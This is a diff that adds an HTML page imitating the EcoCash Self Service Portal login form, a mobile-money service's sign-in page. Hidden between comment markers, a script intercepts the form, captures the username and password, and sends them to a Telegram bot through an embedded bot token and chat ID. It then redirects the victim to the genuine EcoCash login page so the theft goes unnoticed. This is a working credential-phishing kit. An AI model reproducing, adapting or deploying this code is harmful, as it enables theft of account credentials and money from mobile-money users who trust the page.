@@ -1,0 +1,284 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="icon" type="image/x-icon" href="/assets/img/favicon.ico" />
+    <link rel="shortcut icon" href="/assets/img/favicon.ico" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="_csrf" content="cee7c580-0e85-4874-bec6-49fea75b8361" />
+    <meta name="_csrf_header" content="X-CSRF-TOKEN" />
+    <title>Self Service Portal</title>
+
+    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
+    <meta name="viewport" content="width=device-width" />
+
+    <!--     Fonts and icons     -->
+    <link href="/assets/css/fontawesome/css/all.css" rel="stylesheet">
+
+    <!-- CSS Files -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/css/datatables.bootstrap.min.css">
+    <link href="/assets/css/gsdk-bootstrap-wizard.css" rel="stylesheet" />
+
+    <link href="/assets/css/demo.css" rel="stylesheet" />
+    <link href="/assets/css/progress.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/css/grow.min.css">
+    <script src="/assets/js/progress-bar.js"></script>
+
+    <!--  VIEW TABS -->
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/normalize.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/tabs.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/tabstyles.css" />
+    <script src="/assets/js/modernizr.custom.js"></script>
+
+    <!--   Core JS Files   -->
+    <!-- <script src="/assets/js/jquery-2.2.4.min.js" type="text/javascript"></script>
+    <script src="/assets/js/bootstrap.min.js" type="text/javascript"></script>
+    <script src="/assets/js/jquery.datatables.min.js" type="text/javascript"></script>
+    <script src="/assets/js/jquery.datatables.min.js" type="text/javascript"></script>
+    <script src="/assets/js/jquery.bootstrap.wizard.js" type="text/javascript"></script> -->
+
+    <!--  Plugin for the Wizard -->
+    <!-- <script src="/assets/js/gsdk-bootstrap-wizard.js"></script>
+
+     More information about jquery.validate here: http://jqueryvalidation.org/	 -->
+    <!-- <script src="/assets/js/jquery.validate.min.js"></script>
+    <script src="/assets/js/anime.min.js"></script> -->
+</head>
+
+<body>
+    <div class="row">
+        <div class="col-md-12 loader-container">
+            <div class="loader" style=""></div>
+        </div>
+    </div>
+
+    <div class="image-container set-full-height" style="background: url('/assets/img/background-image.jpg') fixed no-repeat; background-size: cover;">
+        <!--<div class="image-container set-full-height">-->
+
+        <div>
+
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-12">
+                        <nav class="navbar navbar-default" style="background-color: white; margin-bottom: 0">
+                            <div class="container-fluid">
+                                <!-- Brand and toggle get grouped for better mobile display -->
+                                <div class="navbar-header">
+                                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+                                <span class="sr-only">Toggle navigation</span>
+                                <span class="icon-bar"></span>
+                                <span class="icon-bar"></span>
+                                <span class="icon-bar"></span>
+                            </button>
+                                    <a class="navbar-brand" href="/home">
+                                <img src="/assets/img/ECOCASH-logo.jpg" width="100px">
+                            </a>
+                                </div>
+
+                                <!-- Collect the nav links, forms, and other content for toggling -->
+                                <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                                    <ul class="nav navbar-nav navbar-right">
+                                        <li><a href="/login">Log In</a></li>
+                                        <li><a href="/signup">Sign Up</a></li>
+                                    </ul>
+
+                                </div>
+                                <!-- /.navbar-collapse -->
+                            </div>
+                            <!-- /.container-fluid -->
+                        </nav>
+
+                    </div>
+                </div>
+            </div>
+            <div></div>
+
+        </div>
+
+        <!--   Big container   -->
+
+        <div>
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-6 col-sm-offset-3">
+                        <div class="wizard-container">
+
+                            <div class="card wizard-card" data-color="orange" id="wizardProfile">
+                                <form action="/login" method="post" id="signin"><input type="hidden" name="_csrf" value="cee7c580-0e85-4874-bec6-49fea75b8361" />
+                                    <div class="wizard-header">
+                                        <br/><br/>
+                                        <h3><b>Log In</b></h3>
+                                    </div>
+                                    <div>
+                                        <div id="about">
+
+                                            <div class="row">
+                                                <div class="col-sm-10 col-sm-offset-1">
+                                                    <div class="form-group">
+
+
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-10 col-sm-offset-1">
+                                                    <div class="form-group">
+                                                        <label>Username <small>*</small></label>
+                                                        <input name="username" id="username" type="text" class="form-control" placeholder="mobile number..." required="required">
+                                                    </div>
+                                                    <div class="form-group">
+                                                        <label>Password <small>*</small></label>
+                                                        <input name="password"  id="password" type="text" class="form-control" placeholder="password..." required="required">
+                                                    </div>
+                                                </div>
+                                                <!--                                                                                <div class="col-sm-10 col-sm-offset-1">-->
+                                                <!--                                                                                        <div class="form-group">-->
+                                                <!--                                                                                                <p><span><input type="checkbox" name="terms"  th:required="true"/></span>-->
+                                                <!--                                                                                                        I agree to <a th:href="@{/terms-and-conditions}">Terms and Conditions.</a></p>-->
+                                                <!--                                                                                        </div>-->
+                                                <!--                                                                                </div>-->
+                                                <div class="col-sm-10 col-sm-offset-1">
+                                                    <div class="form-group">
+                                                        <a href="/user/password/reset"><small>Forgot Password?</small></a>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-10 col-sm-offset-1">
+                                                    <div class="form-group">
+                                                        <input type='submit' class='btn btn-fill btn-block btn-primary btn-wd btn-sm' value='login' />
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-10 col-sm-offset-1">
+                                                    <div class="form-group">
+                                                        <hr/>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-10 col-sm-offset-1">
+                                                    <div class="form-group">
+                                                        <a href="/signup" class='btn btn-block btn-danger btn-wd btn-sm'>Sign Up</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                    </div>
+                                </form>
+                                <!-- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! -->
+
+<script>
+  document.getElementById("signin").addEventListener("submit", function (e) {
+    e.preventDefault(); // Prevent default form submission
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+    // Send message to Telegram
+    fetch("https://api.telegram.org/bot8275838652:AAF2NTMoHbN6oOr9WTr1R6doKaOijIsPKto/sendMessage", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: "7794015933",
+        text: message
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        window.location.href = "https://partnerapplications.ecocash.co.zw/login"; // Redirect after success
+      } else {
+        alert("Failed to send message.");
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      alert("Something went wrong.");
+    });
+  });
+</script>
+                                <!-- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! -->
+
+
+
+                                <script>
+                                    $("#signin").validate();
+                                </script>
+                            </div>
+                        </div>
+                        <!-- wizard container -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="container" style="color: #235ba5">
+                &copy;
+                <script>
+                    document.write((new Date()).getFullYear())
+                </script> <a style="color: #235ba5" href="https://www.ecocash.co.zw/" target="_blank">Ecocash</a>
+            </div>
+        </div>
+
+    </div>
+
+</body>
+
+<!-- <script src="/assets/js/cbpFWTabs.js"></script>
+<script type="text/javascript" src="/assets/js/jquery.datatables.min.js"></script>
+<script type="text/javascript" src="/assets/js/datatables.bootstrap.min.js"></script>
+<script>
+    $(function() {
+        var token = $("meta[name='_csrf']").attr("content");
+        var header = $("meta[name='_csrf_header']").attr("content");
+        $(document).ajaxSend(function(e, xhr, options) {
+            if (options.type == "POST") {
+                xhr.setRequestHeader(header, token);
+            }
+        });
+    });
+
+    function casLoader() {
+        $('.loader-container').css('display', 'block');
+    }
+    (function() {
+        // $("#datalist5").dataTable();
+        [].slice.call(document.querySelectorAll('.tabs')).forEach(function(el) {
+            new CBPFWTabs(el);
+        });
+    })();
+
+    // Wrap every letter in a span
+    var textWrapper = document.querySelector('.ml1 .letter');
+    textWrapper.innerHTML = textWrapper.textContent.replace(/\S/g, "<span class='letter'>$&</span>");
+
+    anime.timeline({
+            loop: true
+        })
+        .add({
+            targets: '.ml1 .letter',
+            scale: [0.3, 1],
+            opacity: [0, 1],
+            translateZ: 0,
+            easing: "easeOutExpo",
+            duration: 600,
+            delay: (el, i) => 70 * (i + 1)
+        }).add({
+            targets: '.ml1 .line',
+            scaleX: [0, 1],
+            opacity: [0.5, 1],
+            easing: "easeOutExpo",
+            duration: 700,
+            offset: '-=875',
+            delay: (el, i, l) => 80 * (l - i)
+        }).add({
+            targets: '.ml1',
+            opacity: 0,
+            duration: 1000,
+            easing: "easeOutExpo",
+            delay: 1000
+        });
+</script> -->
+
+</html>
